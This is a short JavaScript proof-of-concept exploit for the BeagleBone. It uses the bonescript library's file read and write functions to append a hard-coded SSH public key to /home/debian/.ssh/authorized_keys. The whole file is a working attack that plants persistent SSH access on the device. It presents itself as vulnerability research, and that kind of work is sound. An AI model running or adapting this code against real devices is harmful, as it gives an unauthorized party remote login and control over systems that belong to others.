/**
This is a POC implementation of an exploit for the BeagleBone using bonescript.
This file implements an append function on any file in the system.
*/

var b = require('bonescript');
// file to be changed
var file = '/home/debian/.ssh/authorized_keys';
// this is the data read
let output = '';
// this is the data to append
let append = 'ssh-rsa \
AAAAB3NzaC1yc2EAAAADAQABAAABAQCp+20ZgyXbekAnctHH0GO5s/U0QW6nMlXIImS0bxlATivvKXc066uoKYtiwtE5dnQ/vsUIosom9zVbLBCAr5Uprlthr6ufr+9sEjn3VnlZ3MKljLG79CkorgzWeylsBe27SRI8z+bTsXv1zELQsiW7FPOt/ha00YlvFc6BwWs0cZXbE7/Q5aorXg3Ea+25XZsNtJvWWS/Td1MAn3JPhzHPkajXsVjrhxLO7Sc/GgZd14SxdEhUkc5JItQBerrqMzhUgbSWVGmfZiTtXypPMfX0axPbsiFVYEYmOcVL6IxF5ouppMqOIWE3zbpcnLv+g36IY93HLjElqCSngzi6A2sT\
 luke@lukeubuntu';

// this function reads file and outputs data in the output variable
b.readTextFile(file, function (x){
    output = x.data;
    console.log('inside method output of x'+output);
});

// this function writes data to a file
// this function is delayed so it does not write before read is completed
setTimeout(function(){ 
     console.log("output of x:  "+output);
    b.writeTextFile(file, output+append, readStatus);
}, 3000); 

function readStatus(x) {
    console.log(JSON.stringify(x));
}

